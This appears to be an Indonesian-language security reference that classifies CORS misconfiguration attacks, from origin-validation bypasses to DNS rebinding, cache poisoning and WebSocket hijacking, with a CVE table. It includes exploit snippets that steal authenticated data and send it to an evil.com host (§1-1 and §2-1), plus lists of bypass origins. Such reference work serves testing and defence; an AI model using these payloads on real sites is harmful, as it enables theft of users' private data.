---
title: CORS Misconfiguration
---

## Struktur Klasifikasi

Taksonomi ini mengklasifikasikan seluruh permukaan serangan CORS berdasarkan tiga sumbu ortogonal yang diturunkan dari analisis sistematis CVE, laporan bug bounty, penelitian akademik, dan tulisan praktisi.

**Sumbu 1 — Target Mutasi (Sumbu Utama):** Komponen struktural mekanisme CORS yang salah dikonfigurasi atau dieksploitasi. Sumbu ini mengorganisasi bagian utama dokumen menjadi sembilan kategori: Logika Validasi Origin, Penanganan Null Origin, Interaksi Wildcard & Kredensial, Semantik Header CORS, Mekanisme Preflight, Diferensial Parser Browser, Batas Protokol & Jaringan, Interaksi Cache, dan Eksploitasi Protokol Bersebelahan.

**Sumbu 2 — Jenis Ketidaksesuaian (Lintas-Bidang):** Sifat ketidakcocokan atau bypass yang diciptakan oleh setiap mutasi. Setiap teknik dalam taksonomi ini memetakan ke satu atau lebih jenis ketidaksesuaian berikut:

| Jenis Ketidaksesuaian | Deskripsi |
|---|---|
| **Validation Bypass** | Pemeriksaan origin dielakkan melalui kelemahan regex, manipulasi string, atau kesalahan logika |
| **Trust Boundary Confusion** | Origin yang tidak tepercaya dinaikkan ke status tepercaya melalui kelemahan arsitektur |
| **Parser Differential** | Browser vs. server (atau server vs. server) menginterpretasikan URL/origin yang sama secara berbeda |
| **Cache Key Mismatch** | Header `Origin` memengaruhi respons tetapi bukan bagian dari cache key |
| **Protocol Boundary Evasion** | Penegakan CORS dielakkan dengan beralih ke protokol yang tidak diatur olehnya |
| **Cookie/Credential Scope Mismatch** | Aturan SameSite, atribut Domain, atau perlindungan pelacakan berinteraksi secara tidak terduga dengan CORS |

**Sumbu 3 — Skenario Serangan (Pemetaan):** Tempat mutasi dijadikan senjata — pencurian kredensial, eksfiltrasi data, rekon jaringan internal, cache poisoning/DoS, bypass WAF/firewall, atau rantai pengambilalihan akun. Dijelaskan secara rinci dalam §10.

### Mekanisme Fundamental

CORS beroperasi sebagai **relaksasi** dari Same-Origin Policy (SOP). Browser mengirimkan header `Origin`; server merespons dengan `Access-Control-Allow-Origin` (ACAO) dan secara opsional `Access-Control-Allow-Credentials` (ACAC). Browser menegakkan kebijakan di sisi klien. Ini menciptakan ketegangan fundamental: **server memutuskan** siapa yang dapat membaca responsnya, tetapi melakukannya dengan mengurai input yang dapat dipengaruhi penyerang (`Origin`). Setiap mutasi dalam taksonomi ini mengeksploitasi aspek tertentu dari pendelegasian kepercayaan ini.

---

## §1. Mutasi Logika Validasi Origin

Kelas kerentanan CORS yang paling umum. Server mencoba memvalidasi header `Origin` terhadap daftar izin, tetapi mengimplementasikan pemeriksaan secara salah, sehingga origin yang dikontrol penyerang dapat lolos validasi.

### §1-1. Refleksi Origin Langsung

Server mencerminkan nilai header `Origin` langsung ke dalam `Access-Control-Allow-Origin` tanpa validasi apa pun.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Refleksi Penuh** | `ACAO` diatur ke nilai apa pun yang muncul dalam header permintaan `Origin` | Server menggunakan ACAO dinamis tanpa pemeriksaan apa pun |
| **Refleksi dengan Kredensial** | Refleksi penuh dikombinasikan dengan `ACAC: true`, memungkinkan pembacaan lintas-origin yang menyertakan kredensial | Server menggabungkan `ACAO: <reflected>` + `ACAC: true` |

Ini adalah miskonfigurasi yang paling sederhana dan paling berbahaya. Penyerang meng-hosting halaman di `evil.com` yang mengirimkan `fetch()` berkredensial ke target. Target mencerminkan `evil.com` di ACAO dengan kredensial yang diizinkan, dan penyerang membaca respons penuh termasuk data yang dilindungi autentikasi.

**Contoh payload:**
```javascript
fetch('https://target.com/api/account', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://evil.com/exfil?data=' + JSON.stringify(d)));
```

### §1-2. Bypass Validasi Berbasis Regex

Server menggunakan ekspresi reguler untuk memvalidasi origin, tetapi regex tidak cukup di-anchor atau terlalu permisif.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Suffix Match** | Regex memeriksa apakah origin *diakhiri dengan* domain tepercaya (misalnya `/example\.com$/`) | `evilexample.com` lolos validasi |
| **Prefix Match** | Regex memeriksa apakah origin *dimulai dengan* domain tepercaya | `example.com.evil.com` lolos validasi |
| **Substring Match** | Regex memeriksa apakah origin *mengandung* domain tepercaya | `evil.com?example.com` atau `example.com.evil.com` lolos |
| **Titik Tanpa Escape** | Titik dalam regex tidak di-escape, sehingga cocok dengan karakter apa pun | `exampleXcom.evil.com` lolos untuk regex `/example.com/` |
| **Anchor Hilang** | Regex tidak memiliki anchor `^` atau `$` | Berbagai payload bypass berhasil |
| **Wildcard Subdomain** | Regex mengizinkan `.*\.example\.com` tanpa membatasi kedalaman | `evil.com.a.example.com` melalui subdomain takeover |

**Contoh origin bypass untuk validasi `example.com`:**
```
https://evilexample.com          (suffix match)
https://example.com.evil.com     (prefix match)
https://example.computer         (kebingungan TLD)
https://exampleXcom.evil.com     (titik tanpa escape)
https://evil.com?example.com     (substring dalam query)
https://evil.com#example.com     (substring dalam fragment)
```

### §1-3. Bypass Operasi String

Server menggunakan operasi string non-regex (startsWith, endsWith, contains, indexOf) untuk validasi origin.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Bypass endsWith** | `origin.endsWith("example.com")` cocok dengan `evilexample.com` | Tidak ada pemeriksaan batas domain sebelum suffix yang tepercaya |
| **Bypass startsWith** | `origin.startsWith("https://example.com")` cocok dengan `https://example.com.evil.com` | Tidak ada pemeriksaan terminasi setelah prefix yang tepercaya |
| **Bypass indexOf** | `origin.indexOf("example.com") !== -1` cocok dengan origin mana pun yang mengandung string tersebut | Tidak ada batasan posisi atau batas |

### §1-4. Kesalahan Implementasi Daftar Izin

Server mempertahankan daftar izin eksplisit tetapi mengimplementasikan pencarian secara salah.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Sensitivitas Huruf Besar/Kecil** | Perbandingan daftar izin peka huruf besar/kecil tetapi browser mengirimkan huruf kecil | Ketidakcocokan `EXAMPLE.COM` vs `example.com` |
| **Ketidakcocokan Skema** | Daftar izin menyimpan `https://` tetapi server tidak memeriksa skema | Origin `http://` lolos untuk daftar izin khusus HTTPS |
| **Penghilangan Port** | Daftar izin tidak memperhitungkan port non-standar | `https://example.com:8443` vs `https://example.com` |
| **Trailing Slash/Path** | Origin dengan atau tanpa komponen path akhir menyebabkan ketidakcocokan | Parsing yang bergantung pada implementasi |

---

## §2. Eksploitasi Null Origin

Nilai khusus `Origin: null` dikirimkan oleh browser dalam beberapa konteks yang sah. Server yang memasukkan `null` ke dalam daftar izin tanpa disadari mempercayai berbagai konteks yang dikontrol penyerang.

### §2-1. Teknik Pembuatan Null Origin

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Sandboxed iframe** | `<iframe sandbox="allow-scripts" src="data:text/html,...">` mengirimkan `Origin: null` | Server mengizinkan `null` dalam ACAO |
| **URI `data:`** | Permintaan dari dokumen skema `data:` membawa `Origin: null` | Sama seperti di atas |
| **URI `file:`** | File lokal yang dibuka di browser mengirimkan `Origin: null` | Memerlukan korban untuk membuka file lokal |
| **Cross-origin redirect** | Beberapa rantai redirect menyebabkan browser menetapkan `Origin: null` | Topologi redirect tertentu diperlukan |
| **Serialized opaque origin** | Konteks mana pun yang dianggap browser sebagai "opaque origin" mengirimkan `null` | Kasus tepi yang didefinisikan spesifikasi |

**Pola eksploitasi kanonik:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/sensitive', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>new Image().src='https://evil.com/steal?d='+encodeURIComponent(d))
  </script>">
</iframe>
```

### §2-2. Rantai Kepercayaan Null Origin

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Sisa Pengembangan** | `null` dimasukkan ke daftar izin selama pengembangan (misalnya untuk pengujian `file://`) dan dibiarkan di produksi | Umum dalam framework dengan middleware CORS |
| **Default Framework** | Default library CORS menyertakan `null` dalam origin yang diizinkan | Developer tidak menimpa default |
| **Parsing Terlalu Luas** | Server mengurai nilai ACAO dari konfigurasi, memperlakukan `null` sebagai entri yang valid daripada kata kunci khusus | Quirk parsing konfigurasi |

---

## §3. Interaksi Wildcard & Kredensial

Spesifikasi CORS melarang penggabungan `Access-Control-Allow-Origin: *` dengan `Access-Control-Allow-Credentials: true`. Mutasi dalam kategori ini mengeksploitasi kesalahpahaman tentang pembatasan ini atau menemukan cara untuk mengelakkannya.

### §3-1. Miskonfigurasi Wildcard

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Bypass Wildcard + Kredensial (Bug Framework)** | Framework atau middleware mengizinkan penetapan `ACAO: *` dengan `ACAC: true` secara bersamaan, melanggar spesifikasi | Versi framework yang rentan (misalnya CVE-2024-25124 di Go Fiber) |
| **Wildcard pada Endpoint Sensitif** | `ACAO: *` pada endpoint yang mengandalkan autentikasi non-cookie (token Bearer, API key dalam header) | Mekanisme autentikasi tidak menggunakan cookie |
| **Wildcard Subdomain** | `ACAO: *.example.com` bukan nilai header CORS yang valid, tetapi beberapa middleware kustom mengimplementasikannya | Penanganan CORS kustom menginterpretasikan wildcard subdomain |

### §3-2. Refleksi Dinamis yang Menyertakan Kredensial

Ketika developer menyadari bahwa mereka tidak dapat menggunakan `*` dengan kredensial, mereka mengimplementasikan refleksi dinamis (§1-1) sebagai solusi sementara, yang sering menciptakan kerentanan yang lebih parah.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Reflect-All-with-Credentials** | Server mencerminkan origin apa pun + `ACAC: true` sebagai "perbaikan" untuk keterbatasan wildcard | Developer salah memahami spesifikasi CORS |
| **Conditional Credential Toggle** | Server mencerminkan origin tetapi hanya menambahkan `ACAC: true` untuk origin "tepercaya" (dengan pemeriksaan kepercayaan yang rusak) | Pemeriksaan kepercayaan dapat dilewati per §1-2 atau §1-3 |

### §3-3. Paparan Data Tanpa Kredensial

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Data Sensitif Tanpa Autentikasi** | `ACAO: *` pada endpoint yang mengembalikan data sensitif yang tidak dilindungi cookie | API mengembalikan PII, data internal, atau konfigurasi tanpa autentikasi |
| **Wildcard Jaringan Internal** | Layanan internal menggunakan `ACAO: *` dengan asumsi isolasi jaringan memberikan keamanan | Penyerang mendapatkan posisi jaringan internal mana pun (§8) |

---

## §4. Mutasi Semantik Header CORS

Eksploitasi header respons CORS individual di luar `ACAO` dan `ACAC`.

### §4-1. Eksploitasi Exposed Headers

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Over-Exposed Custom Headers** | `Access-Control-Expose-Headers` mengungkapkan header kustom yang sensitif terhadap keamanan (token, ID internal, info debug) | Server mengekspos header yang berisi data sensitif |
| **Kebocoran Header Authorization** | `Access-Control-Expose-Headers: Authorization` memungkinkan pembacaan lintas-origin token autentikasi | Token dikembalikan dalam header respons |

### §4-2. Penyalahgunaan Allowed Headers

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Reflected XSS melalui Custom Header** | Server mencerminkan nilai header kustom dalam respons tanpa encoding; `Access-Control-Allow-Headers` mengizinkan header kustom lintas-origin | XSS dalam header yang dicerminkan + CORS mengizinkan pengirimannya |
| **Header Injection** | Server tidak memvalidasi `Origin` untuk karakter ilegal seperti `\r\n`, memungkinkan HTTP header injection | Perilaku lama IE/Edge; server yang tidak melakukan sanitasi |

### §4-3. Eksploitasi Allowed Methods

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Metode yang Terlalu Permisif** | `Access-Control-Allow-Methods: *` atau mencantumkan metode berbahaya (PUT, DELETE, PATCH) | Dikombinasikan dengan bypass origin untuk mengaktifkan operasi yang mengubah state |
| **Method Override** | Menggunakan header `X-HTTP-Method-Override` untuk mengonversi permintaan sederhana (POST) menjadi metode non-sederhana tanpa memicu preflight | Server mendukung method override; CORS mengizinkan header override |

### §4-4. Penyalahgunaan Max-Age

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Preflight Cache Berumur Sangat Panjang** | `Access-Control-Max-Age` diatur ke nilai sangat tinggi, meng-cache respons preflight yang permisif | Penyerang memicu satu preflight yang berhasil, memanfaatkan cache yang diperpanjang |
| **Zero Max-Age** | `Access-Control-Max-Age: 0` memaksa preflight pada setiap permintaan, memungkinkan DoS melalui amplifikasi permintaan | Penyerang memicu banyak pasangan preflight + permintaan aktual |

---

## §5. Mutasi Mekanisme Preflight

Preflight CORS (permintaan `OPTIONS`) adalah penjaga gerbang untuk permintaan non-sederhana. Mutasi di sini melewati atau melemahkan pemeriksaan preflight.

### §5-1. Eksploitasi Simple Request

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Manipulasi Content-Type** | Mempertahankan `Content-Type` sebagai `text/plain`, `application/x-www-form-urlencoded`, atau `multipart/form-data` untuk menghindari pemicu preflight | Server menerima jenis konten ini untuk endpoint API |
| **Simple Header Constraint** | Membatasi permintaan hanya pada header yang masuk daftar aman CORS untuk melewati preflight sepenuhnya | Endpoint target tidak memerlukan header kustom |
| **POST dengan form encoding** | Mengirimkan payload seperti JSON melalui `application/x-www-form-urlencoded` untuk menghindari preflight | Server mendeserialisasi data form sebagai JSON atau menerima keduanya |

### §5-2. Manipulasi Respons Preflight

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Permissive OPTIONS Handler** | Handler `OPTIONS` mengembalikan `ACAO: *` atau mencerminkan origin terlepas dari kebijakan endpoint aktual | Handler OPTIONS dan GET/POST memiliki logika CORS yang berbeda |
| **Missing Preflight Handler** | Server mengembalikan 404/405 untuk OPTIONS tetapi memproses permintaan aktual tanpa penegakan CORS | Framework tidak memblokir permintaan aktual ketika preflight gagal |
| **Preflight Cache Poisoning** | Origin penyerang menerima respons preflight yang permisif yang di-cache, berlaku untuk permintaan berikutnya dari origin lain | Cache tidak menggunakan Origin sebagai key untuk respons OPTIONS |

### §5-3. Vektor Serangan Bebas-Preflight

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **HTML Form Submission** | Menggunakan `<form>` dengan `method="POST"` melewati CORS sepenuhnya (tidak ada pemeriksaan Origin di server) | Server mengandalkan CORS alih-alih CSRF token |
| **Side-Effect Tag Image/Script** | `<img src="https://target.com/api/action">` memicu permintaan GET tanpa CORS | Operasi yang mengubah state sensitif pada endpoint GET |
| **Permintaan Berbasis Navigasi** | Navigasi `window.location` atau tag `<a>` tidak menegakkan CORS | Server melakukan tindakan pada permintaan navigasi |

---

## §6. Mutasi Diferensial Parser Browser

Browser yang berbeda mengurai nama domain, URL, dan karakter khusus secara berbeda. Diferensial ini dapat melewati validasi origin sisi server yang mengasumsikan perilaku browser yang seragam.

### §6-1. Injeksi Karakter Khusus

| Subtipe | Mekanisme | Browser Terpengaruh | Kondisi Utama |
|---------|-----------|---------------------|---------------|
| **Bypass Backtick** | Safari menerima backtick (`` ` ``) dalam hostname: `` http://example.com`.evil.com `` — regex server mungkin melihat `example.com` sebagai host | Safari | Regex server tidak memperhitungkan backtick sebagai delimiter |
| **Bypass Underscore** | Chrome, Firefox, Safari menerima underscore dalam subdomain: `http://example.com_.evil.com` | Chrome, Firefox, Safari | Regex rusak pada underscore sebagai karakter yang tidak terduga |
| **Injeksi Curly Brace** | Safari menerima `{` dalam hostname: `http://example.com{.evil.com` | Safari | Kebingungan parser antara komponen hostname |
| **Karakter Pipe** | Beberapa browser menerima `|` dalam posisi hostname tertentu | Bergantung pada browser | Quirk parser spesifik implementasi |
| **Tanda Seru** | `!` dalam label subdomain diterima oleh beberapa browser | Bergantung pada browser | Sama seperti di atas |

**Metodologi pengujian:** Fuzz header `Origin` secara sistematis dengan karakter dari rentang ASCII dan Unicode, menguji karakter mana yang dikirimkan oleh setiap browser dan bagaimana regex server target menanganinya. URL validation bypass cheat sheet PortSwigger menyediakan data perilaku browser karakter-per-karakter yang komprehensif.

### §6-2. Kebingungan Komponen URL

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Userinfo Confusion** | `https://example.com@evil.com` — beberapa parser mengekstrak `example.com` sebagai host, yang lain melihat `evil.com` | Parser server berbeda dari parser browser |
| **Fragment Injection** | `https://evil.com#example.com` — pemeriksaan string-contains server cocok pada fragment | Server menggunakan indexOf/contains untuk validasi |
| **Query Parameter Injection** | `https://evil.com?ref=example.com` — mirip dengan fragment injection | Server menggunakan pencocokan substring |
| **Port Confusion** | `https://example.com:evil.com` — diferensial parser pada batas port vs. hostname | Parser URL non-standar |

### §6-3. Diferensial Encoding

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Percent-Encoding** | `%65xample.com` (huruf 'e' yang di-encode) dapat melewati perbandingan string tetapi di-resolve secara identik | Server membandingkan string mentah; browser menormalisasi |
| **Unicode/Punycode** | IDN homograph: `exаmple.com` (huruf 'а' Sirilik) vs `example.com` | Server memvalidasi Unicode; DNS me-resolve Punycode |
| **Double Encoding** | `%2565xample.com` yang di-decode dua kali menghasilkan `example.com` | Server men-decode sekali; komponen hilir men-decode lagi |

---

## §7. Eskalasi Batas Kepercayaan

Miskonfigurasi CORS menjadi sangat dapat dieksploitasi ketika dikombinasikan dengan kerentanan lain yang memberikan pijakan di origin yang tepercaya.

### §7-1. Eskalasi Berbasis Subdomain

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **XSS pada Subdomain Tepercaya** | CORS mempercayai `*.example.com`; penyerang menemukan XSS di `blog.example.com` dan menggunakannya untuk membuat permintaan CORS berkredensial ke `api.example.com` | Subdomain mana pun memiliki XSS + CORS mempercayai semua subdomain |
| **Subdomain Takeover** | CORS mempercayai `*.example.com`; `old.example.com` memiliki catatan DNS menggantung (CNAME ke layanan yang sudah tidak disediakan) | Subdomain takeover memungkinkan + CORS mempercayai semua subdomain |
| **Layanan Subdomain Pihak Ketiga** | CORS mempercayai subdomain; sebuah subdomain mengarah ke layanan pihak ketiga (GitHub Pages, Heroku, dll.) di mana penyerang dapat meng-hosting konten | Layanan pihak ketiga mengizinkan konten kustom |

**Amplifikasi dampak:** Eksploit yang di-hosting pada subdomain secara otomatis melewati pembatasan cookie `SameSite=Lax` karena mereka berbagi domain yang sama yang dapat didaftarkan. Artinya, eksploit CORS berbasis subdomain dapat menyertakan kredensial bahkan ketika `SameSite` dikonfigurasi dengan benar.

### §7-2. Protocol Downgrade

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Kepercayaan HTTP-ke-HTTPS** | CORS mempercayai `http://example.com` bersama `https://example.com`; penyerang melakukan MitM pada koneksi HTTP | Tidak ada HSTS; CORS mengizinkan origin HTTP untuk endpoint HTTPS |
| **Eksploitasi Mixed Content** | Subdomain tidak aman (HTTP) yang dipercaya domain utama yang aman (HTTPS) | Browser mengizinkan mixed-content dalam konteks tertentu |

### §7-3. Kepercayaan Origin Pihak Ketiga

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Kompromi Domain Mitra** | CORS mempercayai domain mitra; domain mitra dikompromikan atau memiliki XSS | Kepercayaan yang terlalu luas terhadap origin eksternal |
| **Kepercayaan Origin CDN** | CORS mempercayai domain CDN (misalnya `*.cloudfront.net`) yang digunakan bersama oleh banyak tenant | Tenant CDN lain dapat menyajikan JavaScript yang dikontrol penyerang |
| **Kepercayaan OAuth Provider** | CORS mempercayai domain OAuth provider; penyerang meng-hosting konten pada provider yang sama | SaaS multi-tenant dipercaya sebagai origin |

---

## §8. Mutasi Batas Jaringan & DNS

Serangan yang mengeksploitasi CORS untuk melintasi batas jaringan atau menggunakan teknik tingkat DNS untuk mengelakkan pembatasan origin.

### §8-1. Eksploitasi Jaringan Internal

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Intranet CORS Wildcard** | Layanan internal menggunakan `ACAO: *` dengan asumsi perimeter jaringan memberikan keamanan | Halaman penyerang dimuat di browser korban pada jaringan internal |
| **Eksploitasi Layanan Localhost** | Server pengembangan lokal atau aplikasi desktop dengan UI web menggunakan CORS yang permisif | Korban mengunjungi halaman penyerang saat menjalankan layanan lokal (misalnya CVE-2024-28224 Ollama) |
| **Akses Cloud Metadata** | Miskonfigurasi CORS dikombinasikan dengan pola mirip SSRF untuk mengakses cloud metadata (169.254.169.254) | Layanan internal mencerminkan header CORS + endpoint metadata yang dapat diakses |

### §8-2. Bypass Private Network Access (PNA)

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Ketiadaan PNA Preflight** | Browser yang belum menegakkan PNA preflight (Firefox, Chrome lama) mengizinkan permintaan lintas-origin ke IP privat | Browser target tidak mengimplementasikan PNA |
| **Miskonfigurasi Header PNA** | Server mengembalikan `Access-Control-Allow-Private-Network: true` tanpa validasi origin yang tepat (CVE-2024-6221 di Flask-CORS) | Default framework mengizinkan akses jaringan privat |
| **Eksploitasi Router/IoT** | Router rumah dan perangkat IoT dengan antarmuka web tidak memiliki perlindungan CORS sama sekali | Browser korban berada di jaringan yang sama dengan perangkat target |

### §8-3. DNS Rebinding

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **DNS Rebinding Klasik** | DNS penyerang awalnya me-resolve ke IP penyerang (menyajikan halaman eksploit), lalu melakukan rebind ke IP internal target. Browser menganggapnya sebagai same-origin. | Layanan target tidak memvalidasi header Host; DNS TTL kedaluwarsa |
| **Rebinding Berbasis TTL** | Mengeksploitasi kedaluwarsa DNS TTL untuk mengubah resolusi IP di tengah sesi | TTL rendah pada catatan DNS penyerang |
| **DNS Rebinding + CORS** | DNS penyerang pertama-tama mengembalikan header CORS yang permisif dari servernya, lalu melakukan rebind ke target. Kebijakan CORS yang di-cache berlaku untuk respons target. | Layanan target mewarisi izin CORS yang di-cache |
| **Service Worker Persistence** | Menggabungkan DNS rebinding dengan registrasi service worker untuk akses persisten | Target mengizinkan registrasi service worker lintas-origin |

### §8-4. Eksploitasi Berbasis Typosquatting

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Typosquat Domain Internal** | Daftarkan typosquat domain korporat internal; karyawan yang salah mengetik URL mendarat di halaman penyerang, yang menyelidiki miskonfigurasi CORS internal | Layanan internal memiliki CORS yang permisif; karyawan mengunjungi typosquat |
| **Service Worker Injection** | Teknik of-CORS: halaman typosquat mendaftarkan service worker yang terus-menerus menyelidiki endpoint internal untuk mencari miskonfigurasi CORS | Dikombinasikan dengan registrasi service worker browser |

---

## §9. Mutasi Interaksi Cache

Respons CORS yang berinteraksi dengan lapisan caching dapat dieksploitasi untuk cache poisoning, denial of service, atau kebocoran data.

### §9-1. Ketiadaan Vary: Origin

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Cross-Origin Cache Poisoning** | Server mengembalikan header CORS yang bergantung pada origin tetapi tanpa `Vary: Origin`. CDN meng-cache respons dengan `ACAO: evil.com`, menyajikannya kepada permintaan yang sah. | CDN/proxy meng-cache respons; tidak ada header `Vary: Origin` |
| **Cache Poisoning DoS** | Penyerang mengirimkan permintaan dengan `Origin: evil.com`, mendapatkan respons yang di-cache dengan `ACAO: evil.com`. Permintaan lintas-origin yang sah dari origin tepercaya gagal karena ACAO yang di-cache tidak cocok. | Sama seperti di atas; digunakan untuk denial of service |
| **Reverse Cache Poisoning** | Permintaan sah yang di-cache dengan `ACAO: trusted.com`. Permintaan penyerang disajikan dari cache, menerima nilai ACAO yang tepercaya. | Origin tidak ada dalam cache key; respons dapat di-cache |

### §9-2. Eksploitasi Browser Cache

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Berbagi Cache Fetch/Navigation** | Cache privat browser dibagikan antara `fetch()` dan navigasi. Penyerang melakukan pre-poison cache melalui `fetch()` yang diaktifkan CORS dengan header berbahaya; korban bernavigasi ke URL dan menerima respons yang diracuni. | Sumber daya dapat di-cache; endpoint lolos preflight |
| **Preflight Cache Poisoning** | Respons preflight untuk origin penyerang di-cache; permintaan berikutnya dari origin lain menggunakan kembali preflight yang di-cache | Cache preflight tidak membedakan origin dengan benar (misalnya Mozilla Bug 1200869) |
| **Credential Flag Cache Confusion** | Cache key yang sama dihasilkan untuk permintaan preflight yang hanya berbeda dalam flag kredensial; permintaan berkredensial menggunakan kembali preflight yang tidak berkredensial | Bug pembuatan cache key browser |

### §9-3. Masalah Spesifik CDN

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **CDN Mengabaikan Vary** | CDN seperti Cloudflare secara historis mengabaikan header `Vary`, menyajikan respons yang sama yang di-cache terlepas dari `Origin` | Perilaku CDN tertentu |
| **Pengecualian Cache Key di Edge** | CDN mengecualikan `Origin` dari cache key demi performa; respons yang bergantung pada origin di-cache secara salah | Konfigurasi CDN memprioritaskan tingkat cache hit |

---

## §10. Eksploitasi Protokol Bersebelahan

Protokol yang bersebelahan dengan HTTP yang melewati atau tidak diatur oleh CORS, memungkinkan akses data lintas-origin.

### §10-1. Serangan WebSocket Lintas-Origin

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Cross-Site WebSocket Hijacking (CSWSH)** | Handshake WebSocket (`Upgrade: websocket`) tidak tunduk pada CORS. Browser mengirimkan cookie dengan permintaan upgrade. Halaman penyerang membuka WebSocket ke target, mendapatkan akses baca/tulis penuh. | Server tidak memvalidasi `Origin` pada WebSocket upgrade |
| **Bypass SOP melalui Protokol WS** | Setelah koneksi WebSocket terjalin (101 Switching Protocols), transfer data terjadi melalui protokol `ws://` / `wss://`, sepenuhnya di luar tata kelola SOP/CORS | Server menerima koneksi WebSocket dari origin mana pun |

### §10-2. Eksploitasi Fallback JSONP

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Endpoint JSONP Lama** | Endpoint mendukung CORS dan JSONP (`?callback=`) sekaligus. Bahkan dengan CORS yang ketat, penyerang menggunakan tag `<script>` untuk memuat respons JSONP, melewati CORS sepenuhnya. | Endpoint JSONP ada berdampingan dengan API yang dilindungi CORS |
| **JSONP Callback Injection** | Parameter callback mengizinkan injeksi JavaScript sembarang | Sanitasi callback yang tidak memadai |

### §10-3. postMessage & window.opener

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Bypass Origin postMessage** | Target menggunakan `postMessage` dengan `targetOrigin: "*"` wildcard atau tidak memvalidasi `event.origin` | Komunikasi lintas-origin tanpa pemeriksaan origin yang tepat |
| **Eksploitasi window.opener** | Halaman yang dibuka melalui `window.open()` mempertahankan referensi `opener`; penyerang membaca/memanipulasi state opener secara lintas-origin | Tidak ada header `Cross-Origin-Opener-Policy` (COOP) |

### §10-4. Interaksi Cookie SameSite

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Bypass SameSite melalui Subdomain** | Eksploit CORS yang di-hosting pada subdomain target melewati `SameSite=Lax` karena subdomain bersifat same-site | XSS atau subdomain takeover (§7-1) |
| **Interaksi Tracking Protection** | Firefox ETP dan default `SameSite=Lax` Chrome memblokir cookie pihak ketiga, membatasi eksploitasi CORS — tetapi permintaan same-registrable-domain tetap menyertakan cookie | Eksploit harus berada pada eTLD+1 yang sama atau subdomain |
| **Navigasi Top-Level dengan Cookie** | `SameSite=Lax` mengizinkan cookie pada navigasi GET tingkat atas. Penyerang menggunakan redirect `window.location` ke target, lalu membaca respons melalui CORS pada halaman same-origin berikutnya. | Rantai multi-langkah yang mengeksploitasi pengecualian Lax |

---

## §11. Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Arsitektur / Kondisi | Kategori Mutasi Utama |
|----------|----------------------|-----------------------|
| **Pencurian Kredensial / Session Hijacking** | API terautentikasi dengan miskonfigurasi CORS | §1 + §2 + §3-2 |
| **Eksfiltrasi Data Sensitif** | API mengembalikan PII/secret dengan CORS permisif | §1 + §2 + §3-3 + §4-1 |
| **Rekon Jaringan Internal** | Browser korban di jaringan internal; penyerang di eksternal | §8-1 + §8-2 + §8-3 |
| **Cache Poisoning / DoS** | CDN atau proxy meng-cache respons yang bergantung pada origin | §9-1 + §9-2 + §9-3 |
| **Bypass WAF / Firewall** | Typosquatting + penyelidikan CORS layanan internal | §8-4 + §8-1 |
| **Rantai Pengambilalihan Akun** | CORS + XSS pada subdomain + bypass SameSite | §7-1 + §10-4 + §1 |
| **CSRF Mengubah State melalui CORS** | Metode permintaan non-sederhana diaktifkan lintas-origin | §4-3 + §5-1 |
| **Eksploitasi Layanan Lokal** | Aplikasi desktop atau server pengembangan dengan UI web | §8-1 + §8-3 + §3-1 |

---

## Pemetaan CVE / Bounty (2024–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|-----------------|-------------|-----------------|
| §1-1 + §3-2 | CVE-2024-8183 (Prefect) | Akses data lintas-origin yang tidak sah ke database orkestrasi workflow. Kebocoran data, hilangnya kerahasiaan. |
| §3-1 | CVE-2024-25124 (Go Fiber v2) | Middleware CORS framework mengizinkan `ACAO: *` + `ACAC: true` secara bersamaan, melanggar spesifikasi. CVSS 9.4. |
| §1-1 + §3-2 | CVE-2024-41657 (Casdoor ≤1.577.0) | Kerentanan logika dalam beego CorsFilter mengizinkan situs web mana pun membuat permintaan lintas-origin berkredensial. |
| §1-1 + §8-1 | CVE-2025-25301/25302 (rembg) | CORS default yang lemah + SSRF mengizinkan situs web penyerang menjangkau server jaringan internal. |
| §1-1 | CVE-2025-55462 (Eramba) | Refleksi origin dengan `ACAC: true` — origin yang dikontrol penyerang dicerminkan di ACAO. |
